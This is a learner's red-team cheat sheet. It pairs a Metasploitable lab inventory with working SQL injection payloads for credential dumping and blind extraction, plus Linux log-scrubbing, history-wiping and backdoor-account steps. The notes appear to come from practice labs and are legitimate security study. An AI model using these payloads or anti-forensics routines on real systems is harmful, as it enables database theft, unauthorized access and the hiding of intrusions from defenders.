MY RED TEAM CHEATSHEET
Ahmed Ezzat
Last Updated: July 2026

STATUS TAGS
[DONE]    = i practiced this, i can do it from memory
[TAUGHT]  = i understand it but need more practice
[STAGE 3] = i will learn this in exploitation stage
[STAGE 4] = i will learn this in Active Directory stage

======================================================
LINUX
======================================================

Find SUID binaries: [DONE]
find / -perm -4000 2>/dev/null
what i learned: finds files that run as root no matter who runs them
why it matters: these are my privesc targets in Stage 3

Find writable files: [DONE]
find / -writable -type f 2>/dev/null
what i learned: finds files anyone can write to
why it matters: if a root-owned script is writable i can edit it

Find files containing password: [DONE]
grep -r "password" /etc/ 2>/dev/null
what i learned: searches inside every file in /etc/ for the word password
why it matters: admins sometimes leave credentials in config files

List users with real shells: [DONE]
cat /etc/passwd | grep "/bin/bash"
what i learned: filters to only accounts using bash — almost always real humans
real targets: root, msfadmin, postgres, user, service
system noise: daemon, bin, www-data, nobody — ignore these
why it matters: shows me which accounts i can actually target

Live log monitoring: [DONE]
tail -f /var/log/auth.log
what i learned: watches the auth log update in real time
why it matters: i saw my own SSH login appear here live

Failed SSH attempts: [DONE]
grep "Failed password" /var/log/auth.log
what i learned: pulls every failed login with source IP and timestamp
why it matters: shows me if someone is brute forcing a machine

Successful SSH logins: [DONE]
grep "Accepted" /var/log/auth.log
what i learned: shows every successful login
why it matters: my IP appears here every time i SSH in

Check cron jobs: [DONE]
crontab -l
cat /etc/crontab
what i learned: crontab -l shows my user cron jobs
               cat /etc/crontab shows system wide jobs
               format is: minute hour day month weekday user command
               * means every — so * in hour means every hour
what i found on Metasploitable:
               17 * * * * root — runs cron.hourly scripts every hour at minute 17
               25 6 * * * root — runs cron.daily scripts every day at 6:25am
               47 6 * * 7 root — runs cron.weekly scripts every Sunday at 6:47am
               52 6 1 * * root — runs cron.monthly scripts every 1st at 6:52am
why it matters: if a root cron job runs a script i can write to
               i edit that script and it executes as root — instant privesc

Disable history: [DONE]
unset HISTFILE && export HISTSIZE=0
what i learned: unset HISTFILE stops bash writing history to disk
               export HISTSIZE=0 clears memory of commands in session
why it matters: first thing i run after getting a shell so nothing gets logged

Clear history file: [DONE]
cat /dev/null > ~/.bash_history
what i learned: /dev/null is empty — piping it overwrites the file with nothing
why it matters: clears commands typed before i disabled history

Surgical log clean: [DONE]
sudo sed -i '/192.168.56.102/d' /var/log/auth.log
sudo sed -i '/msfadmin/d' /var/log/auth.log
what i learned: sed processes text line by line
               -i edits the file directly
               /pattern/d deletes every line containing that pattern
why it matters: removes only my entries — rest of log stays normal
               full wipe is obvious to defenders, surgical is not
important: use exact IP not partial match
           some session lines have no IP — also clean by username
           always verify with grep after cleaning

Find private keys on target: [DONE]
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
what i found on Metasploitable:
               /home/msfadmin/.ssh/id_rsa — private SSH key
               /etc/mysql/server-key.pem  — MySQL SSL key
               /etc/mysql/client-key.pem  — MySQL client key
               /etc/bind/rndc.key         — DNS key
why it matters: private SSH key can be copied and used to access
               other servers that trust this key — no password needed

Full OPSEC routine — do this every session: [DONE]
1. SSH into target
2. unset HISTFILE && export HISTSIZE=0
3. do your work
4. cat /dev/null > ~/.bash_history
5. sudo sed -i '/192.168.56.102/d' /var/log/auth.log
6. sudo sed -i '/msfadmin/d' /var/log/auth.log
7. verify: grep "192.168.56.102" /var/log/auth.log
8. history — should return nothing
9. exit

======================================================
WINDOWS
======================================================

Navigate directories: [DONE]
cd foldername
what i learned: same as Linux cd, works in both CMD and PowerShell

List folder contents: [DONE]
dir
what i learned: Windows CMD equivalent of ls
               in PowerShell i can use ls or Get-ChildItem

File and folder permissions: [DONE]
icacls C:\path\to\file
what i learned: shows who has what permissions on a file or folder
why it matters: misconfigured permissions are a privesc path in Stage 3

Create new user: [DONE]
New-LocalUser
what i learned: PowerShell prompts me for -Name and -Password automatically
               i dont need to memorize the full syntax
               PowerShell IntelliSense suggests parameters as i type
why it matters: attackers create backdoor accounts after compromising a machine
CMD alternative: net user username password /add

PowerShell aliases: [DONE]
Get-Alias
what i learned: shows all command shortcuts in PowerShell
               ls is an alias for Get-ChildItem
               cd is an alias for Set-Location

======================================================
METASPLOITABLE — SUID BINARIES TO EXPLOIT IN STAGE 3
======================================================

/usr/bin/nmap      old version can spawn a root shell
/usr/bin/at        schedules commands — can run as root
/usr/lib/pt_chown  known privilege escalation vector

======================================================
NETWORKING
======================================================

Standard recon scan: [DONE]
nmap -sV -sC TARGET_IP
what i learned: -sV detects service versions, -sC runs default scripts
always run both together for full picture

Full port scan: [DONE]
nmap -p- TARGET_IP
what i learned: scans all 65535 ports not just top 1000

Ping sweep: [DONE]
nmap -sn 192.168.56.0/24
what i learned: finds live hosts without port scanning
always run this first to confirm Metasploitable IP before every session

Stealth scan: [TAUGHT — practice in Stage 3]
nmap -sS TARGET_IP
what i learned: sends SYN but never completes the handshake
               harder to detect than a full TCP connect scan
               needs root to run

Script scan: [DONE]
nmap -sC TARGET_IP
what i learned: runs default scripts against open ports
extra info it revealed on Metasploitable:
- port 21 — anonymous FTP login allowed, no password needed
- port 25 — VRFY enabled, can enumerate valid usernames
- port 25 — SSLv2 supported, broken encryption, cert expired 2010
- port 111 — NFS shares exposed on port 2049
- port 139 — SMB guest access allowed, message signing disabled
- machine name: metasploitable, domain: localdomain
why it matters: finds vulnerabilities that -sV misses completely

Banner grab with netcat: [DONE]
nc TARGET_IP PORT
what i learned: connects to a port and reads whatever the service sends back

Send raw HTTP GET: [DONE]
nc TARGET_IP 80
then type: GET / HTTP/1.0 and press Enter twice
what i learned: manually sends HTTP request without a browser
what it revealed on Metasploitable:
- Apache 2.2.8 Ubuntu — old version
- PHP 5.2.4 — ancient, multiple exploits
- WebDAV enabled — file upload possible
- web apps: phpMyAdmin, DVWA, Mutillidae, TWiki, WebDAV

Capture traffic: [DONE]
wireshark

Filter by IP in Wireshark: [DONE]
ip.addr == TARGET_IP

Filter FTP in Wireshark: [DONE]
ip.addr == TARGET_IP && ftp

File transfer via Python HTTP server: [DONE]
on Kali:   python3 -m http.server 8080
on target: wget http://192.168.56.102:8080/filename
what i learned: Kali becomes a web server
               target downloads the file with wget
               Kali terminal shows GET request when file is downloaded

File transfer via netcat send: [DONE]
nc TARGET_IP 4444 < file.txt
what i learned: sends file contents through netcat to listener

File transfer via netcat receive: [DONE]
nc -lvp 4444 > file.txt
what i learned: -l listen, -v verbose, -p port number
               opens a listener and saves whatever arrives to a file

Check routing table: [DONE]
route -n
what i found on Kali:
default gateway:  10.0.2.1    via eth1 — internet traffic goes here
lab network:      192.168.56.0 via eth0 — direct connection to Metasploitable
eth0: Host-Only network — lab
eth1: NAT network — internet

Check ARP table: [DONE]
arp -a
what i learned: shows IP to MAC address mappings on my network

MySQL direct access: [DONE]
mysql -h 192.168.56.104 -u root --skip-ssl
no password required — critical misconfiguration
databases found: dvwa, metasploit, mysql, owasp10, tikiwiki
dvwa users table contains MD5 hashed passwords
admin password hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
crack hashes: crackstation.net or hashcat in Stage 3

Follow TCP Stream in Wireshark: [DONE]
right click any packet → Follow → TCP Stream
shows entire conversation as readable text
FTP: credentials visible in plaintext
use this on any captured session to read the full exchange

SMTP username enumeration: [DONE]
nc TARGET_IP 25
VRFY username
252 = user exists
550 = user does not exist
real use: build username list for brute force attacks

======================================================
SSH
======================================================

Basic connect: [DONE]
ssh user@IP

Connect with private key: [DONE — used in Bandit]
ssh user@IP -i keyfile

Connect on custom port: [DONE — used in Bandit]
ssh user@IP -p 2222

Connect to old server with RSA key: [DONE]
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@IP
what i learned: Metasploitable uses old SSH — modern Kali rejects it by default
               these flags force Kali to accept the old key type

Generate key pair: [TAUGHT — need to practice]
ssh-keygen -t rsa -b 4096
what i learned: creates id_rsa (private) and id_rsa.pub (public)
               private key stays on my machine, public goes on target

Copy public key to target: [TAUGHT — need to practice]
ssh-copy-id user@IP

Port forwarding: [TAUGHT — practice in Stage 4]
ssh -L localport:target:targetport user@IP
what i learned: tunnels a remote port to my local machine
               used for pivoting in red team engagements

Brute force SSH: [STAGE 3]
hydra -l user -P wordlist ssh://IP

======================================================
PROXYCHAINS AND TOR
======================================================

Start TOR: [DONE]
sudo service tor start

Verify IP changed: [DONE]
proxychains curl ifconfig.me

Run any tool through TOR: [DONE]
proxychains TOOL OPTIONS

Config file location: [DONE]
/etc/proxychains4.conf

======================================================
MY PYTHON TOOLS — BUILT FROM SCRATCH
======================================================

Single port checker: [DONE]
python3 ~/red-team-tools/python-tools/single_port_checker.py
what it does: checks if one port is open or closed

Port scanner: [DONE]
python3 ~/red-team-tools/python-tools/port_scanner.py
what it does: scans ports 1-1024 and prints open ones only

Banner grabber: [DONE]
python3 ~/red-team-tools/python-tools/banner_grabber.py
what it does: connects to a port and grabs the service banner

Full recon tool: [DONE]
python3 ~/red-team-tools/python-tools/recon.py
what it does: combines scanner and banner grabber in one tool

Advanced recon tool: [DONE]
python3 ~/red-team-tools/python-tools/recon_advanced.py
what it does: scanner + banner grabber + service dictionary + table output + timestamp

======================================================
MY LAB
======================================================

Metasploitable IP:  192.168.56.104
Kali IP:            192.168.56.102
Credentials:        msfadmin / msfadmin (FTP, SSH, Telnet)

Vulnerabilities to exploit in Stage 3:
vsftpd 2.3.4   port 21   backdoor — instant root shell
Samba 3.0.20   port 139  usermap_script — instant root shell
UnrealIRCd     port 6667 backdoor — instant root shell
Bindshell      port 1524 already open — netcat = instant root

======================================================
SERVICES I FOUND ON METASPLOITABLE
======================================================

Port 21   FTP         vsftpd 2.3.4        CRITICAL
Port 22   SSH         OpenSSH 4.7p1       HIGH
Port 23   Telnet      plaintext login     HIGH
Port 25   SMTP        Postfix             MEDIUM
Port 53   DNS         BIND 9.4.2          MEDIUM
Port 80   HTTP        Apache 2.2.8        HIGH
Port 111  RPC                             LOW
Port 139  SMB         Samba 3.0.20        CRITICAL
Port 445  SMB         Samba 3.0.20        CRITICAL
Port 512  rexec       Where are you?      HIGH
Port 513  rlogin                          HIGH
Port 514  rsh         name resolution     HIGH
Port 1099 Java RMI                        MEDIUM
Port 1524 Bindshell   root shell open     CRITICAL
Port 2049 NFS                             MEDIUM
Port 2121 FTP         ProFTPD 1.3.1       HIGH
Port 3306 MySQL       5.0.51a             HIGH
Port 5432 PostgreSQL  8.3.0               HIGH
Port 5900 VNC         protocol 3.3        HIGH
Port 6667 IRC         UnrealIRCd          CRITICAL
Port 8180 Tomcat      Apache Tomcat       HIGH
Port 8787  Metasploit    backdoor listener   CRITICAL
Port 3632  distccd       compiler daemon RCE HIGH
 

======================================================
WEB APP SECURITY — SQL INJECTION
======================================================

What SQLi is:
attacker interferes with SQL queries an app makes to its database
single quote ' is the key character — breaks out of string context
-- comments out rest of query

What SQL is:
language used to talk to databases
every login runs a query like:
SELECT * FROM users WHERE username='ahmed' AND password='1234'

Basic login bypass:
username field input: admin'--
query becomes: SELECT * FROM users WHERE username='admin'--' AND password=''
password check is commented out — logged in as admin without password

Why ' works:
SQL strings are wrapped in single quotes
injecting ' breaks out of the string and lets you write your own SQL
that is the entire concept of SQLi in one sentence

Types of SQLi:

IN-BAND — attack and result use same channel
  Error-based  — force DB errors to reveal version and structure info
  Union-based  — combine queries with UNION to pull extra data from DB

INFERENTIAL (BLIND) — no data transferred directly, no visible output
  Boolean-based — send true/false conditions, observe page differences
                  true condition: page loads normally
                  false condition: page changes or errors
                  extract data character by character based on differences
  Time-based    — send sleep command inside query
                  if page delays — condition is true
                  if page loads instantly — condition is false
                  no visible page change, only timing tells you the answer

OUT-OF-BAND — DB sends data to attacker external server
              DB makes DNS lookup to attacker.com carrying stolen data
              used when in-band and inferential are both blocked
              never see response in app — arrives at your external server

Key SQL vocabulary:
SELECT * FROM users     — get all data from users table
WHERE username='ahmed'  — filter condition
AND / OR                — combine conditions
'                       — breaks string context — injection point
--                      — comments out rest of query
UNION                   — combines two query results into one
ORDER BY 1,2,3          — used to detect number of columns
NULL                    — used in column count detection

Testing perspective:
Black-box — only URL, no source code, test like real attacker
White-box — have source code, more thorough testing possible

Finding SQLi:
submit ' and look for errors or behavior changes
submit '' two quotes and see if error disappears
submit SQL specific syntax and observe differences

Column count detection with ORDER BY:
ORDER BY 1 — works
ORDER BY 2 — works
ORDER BY 3 — error = 2 columns exist

UNION attack — requires:
1. know number of columns in original query
2. know compatible data types of each column
3. use UNION SELECT to pull target data from other tables

Exploit approaches:
Error-based:   enter SQL characters, look for error messages revealing DB info
Union-based:   find column count with ORDER BY, then UNION SELECT stolen data
Boolean-based: submit true/false conditions, observe page differences
Time-based:    submit sleep condition, measure response delay

Prevention:
Primary:    parameterized queries — prepared statements
            never put user input directly into SQL query
Additional: input validation, WAF, least privilege DB accounts


Lab 01 — WHERE clause hidden data retrieval — DONE
goal: retrieve unreleased products
payload: ' or 1=1--
original query: SELECT * FROM products WHERE category='Gifts' AND released=1
injected query: SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
why it works:
- ' closes the string early
- OR 1=1 always true — returns all rows
- -- comments out AND released=1
- unreleased products now visible
note: try '-- - with space if -- alone does not work on MySQL

Lab 02 — Login bypass via SQL injection — DONE
goal: log in as administrator without knowing the password
payload: administrator'-- in username field, anything in password
original query: SELECT * FROM users WHERE username='administrator' AND password='pass'
injected query: SELECT * FROM users WHERE username='administrator'--' AND password='pass'
why it works:
- ' closes the username string early
- -- comments out AND password check entirely
- database only checks if username exists — password ignored
- logged in as administrator
real world use: any login form that builds SQL queries without parameterization

Lab 03 — Oracle version extraction — DONE
payload: ' UNION SELECT banner,NULL FROM v$version--
note: Oracle requires FROM clause — use FROM dual for empty queries

Lab 04 — MySQL/MSSQL version extraction — DONE
payload: ' UNION SELECT @@version,NULL--%20
note: MySQL comment requires space after -- so use --%20 in URL
note: do not use FROM dual for MySQL — Oracle only

Lab 05 — Database contents extraction — DONE
methodology:
1. find column count with ORDER BY
2. find text column with UNION SELECT 'test',NULL
3. list all tables: ' UNION SELECT table_name,NULL FROM information_schema.tables--
4. list columns: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target_table'--
5. dump data: ' UNION SELECT username_col,password_col FROM target_table--
6. login with extracted credentials

Lab 06 — Oracle database contents extraction — DONE
same as Lab 05 but Oracle syntax
list tables:   ' UNION SELECT table_name,NULL FROM all_tables--
list columns:  ' UNION SELECT column_name,NULL FROM all_columns
               WHERE table_name='USERS_KHBIUX'--
dump data:     ' UNION SELECT USERNAME_KSLLLN,PASSWORD_SAGGFL
               FROM USERS_KHBIUX--
note: Oracle uses all_tables and all_columns not information_schema

Lab 07 — Finding column count with NULL — DONE
goal: find number of columns using UNION SELECT NULL
method: add NULLs one at a time until page loads without error
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL-- ← page loaded = 3 columns

Lab 08 — Finding text columns — DONE
goal: find which column accepts string data
method: replace each NULL with a string one at a time
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
whichever loads without error = that column accepts strings

Lab 09 — Retrieving data from other tables — DONE
goal: dump username and password from users table
payload: ' UNION SELECT username,password FROM users--
URL encoded: %27%20UNION%20SELECT%20username,password%20FROM%20users--
note: URL encoding bypasses some filters and browser restrictions

Lab 10 — Retrieving multiple values in single column — DONE
goal: dump two values when only one column accepts strings
technique: CONCAT combines multiple values into one string
payload: ' UNION SELECT NULL,CONCAT(username,password) FROM users--
better:  ' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
why better: separator makes splitting username from password easy
PostgreSQL alternative: username||':'||password (double pipe)

Lab 11 — Blind SQLi with conditional responses — DONE
type: boolean-based blind SQLi
injection point: tracking cookie (not URL parameter)
feedback mechanism: "Welcome back" appears = TRUE, disappears = FALSE

Lab 11 — Blind SQLi with conditional responses — DONE
type: boolean-based blind SQLi
injection point: tracking cookie not URL parameter
feedback: Welcome back appears = TRUE, disappears = FALSE

methodology:
1. confirm injection: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
   increment N until Welcome back disappears — that N is the length
4. extract chars: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POSITION,1)='CHAR'--
   use Burp Intruder cluster bomb — position 1-20, chars a-z 0-9
5. assemble password from results and login

key functions:
SUBSTRING(string, position, length) — extracts characters
LENGTH(string)                      — returns string length

Burp Intruder settings:
attack type: cluster bomb
payload 1:  numbers 1 to 20 (character positions)
payload 2:  a-z and 0-9 (characters to test)
grep match: Welcome back
result: requests with Welcome back = correct character at that position

Lab 12 — Blind SQLi with conditional errors — Oracle — DONE
feedback: server error = TRUE, normal page = FALSE
needed video first to understand CASE WHEN concept

step 1 — confirm database type:
' AND (SELECT '' FROM dual)='  →  Oracle confirmed

step 2 — confirm conditional errors work:
TRUE:  ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
FALSE: ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--

step 3 — confirm administrator exists:
' AND (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--

step 4 — find password length:
' AND (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--

step 5 — extract characters:
' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--

key concepts:
CASE WHEN condition THEN result1 ELSE result2 END — SQL if/else
TO_CHAR(1/0) — divide by zero forces Oracle error
SUBSTR(string,pos,len) — Oracle character extraction
error = TRUE signal, no error = FALSE signal

Burp Intruder: cluster bomb
payload 1: position 1 to password length
payload 2: a-z 0-9
look for: error responses = correct character

Lab 13 — Blind SQLi with time delays — DONE
feedback: page delay = TRUE, instant response = FALSE
goal: cause a 10 second delay

payloads by database:
Oracle:     '|| dbms_pipe.receive_message(('a'),10)--
MSSQL:      '|| WAITFOR DELAY '0:0:10'--
PostgreSQL: '|| (SELECT pg_sleep(10))--
MySQL:      '|| (SELECT SLEEP(10))--

how to identify database: test all four, whichever delays = that database
this lab: PostgreSQL confirmed

Lab 14 — Blind SQLi time-based information retrieval — DONE
same as Lab 12 but delay = TRUE instead of error = TRUE
PostgreSQL uses pg_sleep() not TO_CHAR(1/0)
|| is PostgreSQL string concatenation

confirm user:
'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
delay = administrator exists

find length:
'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
delay = length is greater than N

extract characters:
'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
delay = correct character at that position

PostgreSQL syntax:
|| = string concatenation
pg_sleep(seconds) = time delay
SUBSTR = same as Oracle
CASE WHEN = same structure as Oracle

difference from in-band SQLi:
in-band: see results directly on page
blind:   only true/false signal — extract data character by character

methodology:
1. confirm injection: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
   increment N until Welcome back disappears — that N is the length
4. extract chars: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POSITION,1)='CHAR'--
   use Burp Intruder cluster bomb — position 1-20, chars a-z 0-9
5. assemble password from results and login

key functions:
SUBSTRING(string, position, length) — extracts characters
LENGTH(string)                      — returns string length

Burp Intruder settings for blind SQLi:
attack type: cluster bomb
payload 1:  numbers 1 to 20 (character positions)
payload 2:  a-z and 0-9 (characters to test)
grep match: Welcome back
result: requests with Welcome back = correct character at that position

difference from in-band SQLi:
in-band:  see results directly on page
blind:    only true/false signal — extract data character by character

DATABASE VERSION QUERIES — CHEAT SHEET
Oracle:     SELECT banner FROM v$version
MySQL:      SELECT @@version
PostgreSQL: SELECT version()
MSSQL:      SELECT @@version

IDENTIFY DATABASE TYPE
Oracle:     FROM dual works in query
MySQL:      # works as comment, VERSION() works
PostgreSQL: SELECT version() works
MSSQL:      SELECT @@version works

URL ENCODING — use when browser blocks special characters
'  = %27
space = %20
example: %27%20UNION%20SELECT...

REFERENCE: portswigger.net/web-security/sql-injection/cheat-sheet

information_schema — built-in database map (not Oracle)
information_schema.tables  — all table names
information_schema.columns — all column names per table

Oracle equivalent:
list tables:   SELECT table_name FROM all_tables
list columns:  SELECT column_name FROM all_columns WHERE table_name='target'

======================================================
THINGS I STILL NEED TO PRACTICE
======================================================

[ ] ssh-keygen and ssh-copy-id — generate and deploy key pair
[ ] practice stealth scan — Stage 3
[ ] port forwarding — Stage 4

[x] disable history — DONE
[x] clear bash history file — DONE
[x] surgical log clean by IP and username — DONE
[x] full OPSEC routine from memory — DONE
[x] find private keys on Metasploitable — DONE
[x] run route -n and understand routing table — DONE
[x] send raw HTTP GET via netcat — DONE
[x] transfer file Kali to Metasploitable via Python HTTP server — DONE
[x] transfer file via netcat both directions — DONE
[x] run crontab -l and cat /etc/crontab — DONE
[x] run nmap -sC and read script output — DONE
[x] run nmap -sV and identify all services — DONE
[x] find SUID binaries on Metasploitable — DONE
[x] list users with real shells — DONE
[x] SSH into Metasploitable — DONE
[x] read auth.log live while SSHing in — DONE
[x] grep failed and accepted logins from auth.log — DONE
[x] built 4 Python tools from scratch — DONE
[x] set up GitHub and pushed all tools — DONE
[x] watched first SQLi video — introduction complete — DONE
